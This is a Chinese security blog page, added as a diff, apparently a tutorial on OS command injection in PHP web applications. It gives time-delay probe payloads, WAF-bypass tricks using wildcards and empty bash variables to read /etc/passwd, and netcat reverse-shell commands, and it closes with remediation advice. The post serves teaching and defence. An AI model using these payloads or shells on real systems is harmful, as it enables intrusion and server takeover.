@@ -1,0 +1,226 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Web:命令执行漏洞 - H3ng</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="H3ng,"> 
+    <meta name="description" content="命令执行漏洞原理当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注,"> 
+    <meta name="author" content="H3ng"> 
+    <link rel="alternative" href="atom.xml" title="H3ng" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">H3ng</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://LXH3ng.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">Web:命令执行漏洞</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">Web:命令执行漏洞</h1>
+        <div class="stuff">
+            <span>五月 26, 2021</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h3 id="命令执行漏洞原理"><a href="#命令执行漏洞原理" class="headerlink" title="命令执行漏洞原理"></a>命令执行漏洞原理</h3><p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。</p>
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>脚本语言优点是简洁，方便，但也伴随着一些问题，如速度慢，无法解除系统底层，如果我们开发的应用需要一些除去web的特殊功能时，就需要调用一些外部程序。</p>
+<p>PHP可调用外部程序的常见函数：system,exec,shell_exec,passthru,popen,proc_popen</p>
+<h3 id="命令执行漏洞利用条件"><a href="#命令执行漏洞利用条件" class="headerlink" title="命令执行漏洞利用条件"></a>命令执行漏洞利用条件</h3><ol>
+<li>应用调用执行系统命令的函数</li>
+<li>将用户输入作为系统命令的参数拼接到了命令行中</li>
+<li>没有对用户输入进行过滤或过滤不严</li>
+</ol>
+<h3 id="成因分类"><a href="#成因分类" class="headerlink" title="成因分类"></a>成因分类</h3><p>1.代码层过滤不严格：</p>
+<p>商业应用需要执行命令，商业应用的一些核心代码可能封住在二进制文件当中，在web应用中通过system函数调用。</p>
+<p>system(“/bin/program –arg $arg”)</p>
+<p>2.调用第三方组件存在的代码执行漏洞：</p>
+<p>如wordpress，可以选择imagemagick这个常用的图片处理组件，处理用户上传图片时造成命令执行</p>
+<p>JAVA中 struts2/elasticsearch groovy等</p>
+<h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><ol>
+<li>继承Web服务程序的权限去执行系统命令或读写文件</li>
+<li>反弹shell</li>
+<li>控制整个网站甚至服务器</li>
+<li>进一步内网渗透</li>
+<li>等等</li>
+</ol>
+<p><img src="https://img-blog.csdn.net/20161022154115710?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="img"></p>
+<p><img src="https://img-blog.csdn.net/20161022154121113?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="img"></p>
+<p><img src="https://img-blog.csdn.net/20161022154126460?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="img"></p>
+<p><img src="https://img-blog.csdn.net/20161022154130613?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="img"></p>
+<p>漏洞的渗透方法：</p>
+<p>最可靠的方法使用时间延迟推断，类似与盲注的方法。</p>
+<p>1.在URL上cmd=xxxxxx后拼接||ping -i 30 127.0.0.1   (&amp;)应用程序I ping -i 30 127.0.0.1 I</p>
+<p>可能过滤掉某些命令分隔符 可以换做下面的命令：</p>
+<p>I ping -n 30 127.0.0.1 I<br>&amp; ping -i 30 127.0.0.1 &amp;<br>&amp; ping -n 30 127.0.0.1 &amp;<br>;ping 127.0.0.1 ;<br>%0a ping -i 30 127.0.0.1 %0a ‘ ping 127.0.0.1 ‘</p>
+<p>注意windows和linux的语法不同：</p>
+<p>windows支持：&amp;&amp;,&amp;,||（哪条名令为真执行那条）</p>
+<p>linux支持：&amp;&amp;,&amp;,||（执行为真） | （执行后面的语句）</p>
+<p>2.发生延迟，说明程序可能易于受到命令注入的攻击，对尝试几次，确定不是因为网络延迟造成的，更改-i -n 数值，确定时间延迟是否随着提交的值发生变化。</p>
+<p>3.使用发现的所有可成功实施注入的字符串，尝试注入dir、ls</p>
+<p>4不能在浏览器直接看到回显，可将命令重定向到当前目录下的文件中并查看。或者用TFTP上传工具到服务器，用telnet和netcat建立反向shell，用mail通过SMTP发送结果给自己的计算机。</p>
+<p>5.查看自己的权限，可以提升自己权限，访问敏感数据或控制服务器。</p>
+<h5 id="命令拼接符"><a href="#命令拼接符" class="headerlink" title="命令拼接符"></a>命令拼接符</h5><p>|、||、&amp;、&amp;&amp;的区别：<br>&amp;：无论左边是false还是true，右边都执行<br>&amp;&amp;：具有短路效果，左边是false，右边不执行。<br>|:无论左边是false还是true，右边都会执行<br>||：具有短路效果，左边是true，右边不执行。</p>
+<h5 id="代码执行："><a href="#代码执行：" class="headerlink" title="代码执行："></a>代码执行：</h5><p>利用系统函数实现命令执行，在php下，允许命令执行的函数有：<br>eval（）、assert（）、preg_replace（）、call_user_func（）<br>如果页面中存在这些函数并且对于用户的输入没有做严格的过滤，那么就可能造成远程命令执行漏洞</p>
+<h5 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数</h5><p>ob_start（）、unserialize（）、creat_function（）<br>、usort（）、uasort（）、uksort（）、<br>array_filter（）、<br>array_reduce（）、<br>array_map（）……</p>
+<p><strong>系统命令执行漏洞</strong><br>system（）<br>exec（）<br>shell_exec（）<br>passthru（）<br>pcntl_exec（）<br>popen（）<br>proc_open（）<br>反引号<br>……</p>
+<p><strong>命令执行WAF绕过技巧</strong><br><strong>技巧一：通配符</strong><br>ls-l<br>使用通配符<br>/?in/?s-l</p>
+<p>/???/??t /??c/p???w?<br>有时候WAF不允许使用太多的？号<br>/?in/cat/?tc/p?sswd</p>
+<p>NC反弹shell:<br>nc -e /bin/bash 127.0.0.1 3737<br>为了避免符号，可以将IP地址转换成整型。<br>127.0.0.1-&gt;2130706433</p>
+<p>使用通配符<br>root@kali:~#/??n/?c -e/??n/b??h 2130706433 3737</p>
+<p><strong>技巧二：连接符</strong></p>
+<p><img src="https://img2018.cnblogs.com/blog/1646039/201909/1646039-20190904124248741-71863935.png" alt="img"></p>
+<p><strong>技巧三：未初始化的bash变量</strong><br>在bash环境中允许我们使用未初始化的bash变量，如何<br>$a ,$b,$c<br>我们事先并没有定义它们，输出看看:<br>root@kali:<del># echo $a<br>root@kali:</del># echo $b<br>root@kali:<del># echo $c<br>root@kali:</del>#<br>未初始化的变量值都是null</p>
+<p>读取/etc/passwd:<br>cat$a /etc$a/passwd$a</p>
+<p>测试WAF<br>测试代码：<br><!--?php
+echo "OK";
+system('dig'.$_GET['host']);
+?--></p>
+<p><a target="_blank" rel="noopener" href="http://www.baidu.com;$s/bin$s/which$s">www.baidu.com;$s/bin$s/which$s</a> nc$s<br>反弹shell:<br>/bin$s/nc$s -e/bin$s/bash$s 2130706433 3737</p>
+<p><strong>漏洞修复：</strong></p>
+<ol>
+<li>尽量少用执行命令的函数或者直接禁用</li>
+<li>参数值尽量使用引号包括</li>
+<li>在使用动态函数之前，确保使用的函数是指定的函数之一</li>
+<li>在进入执行命令的函数/方法之前，对参数进行过滤，对敏感字符进行转义</li>
+<li>对PHP语言来说，不能完全控制的危险函数最好不要使用</li>
+</ol>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='//music/1.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">命令执行漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">2.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.</span> <span class="toc-text">命令执行漏洞利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%90%E5%9B%A0%E5%88%86%E7%B1%BB"><span class="toc-number">4.</span> <span class="toc-text">成因分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3"><span class="toc-number">5.</span> <span class="toc-text">漏洞危害</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%8B%BC%E6%8E%A5%E7%AC%A6"><span class="toc-number">5.0.1.</span> <span class="toc-text">命令拼接符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%9A"><span class="toc-number">5.0.2.</span> <span class="toc-text">代码执行：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%87%BD%E6%95%B0"><span class="toc-number">5.0.3.</span> <span class="toc-text">其他函数</span></a></li></ol></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
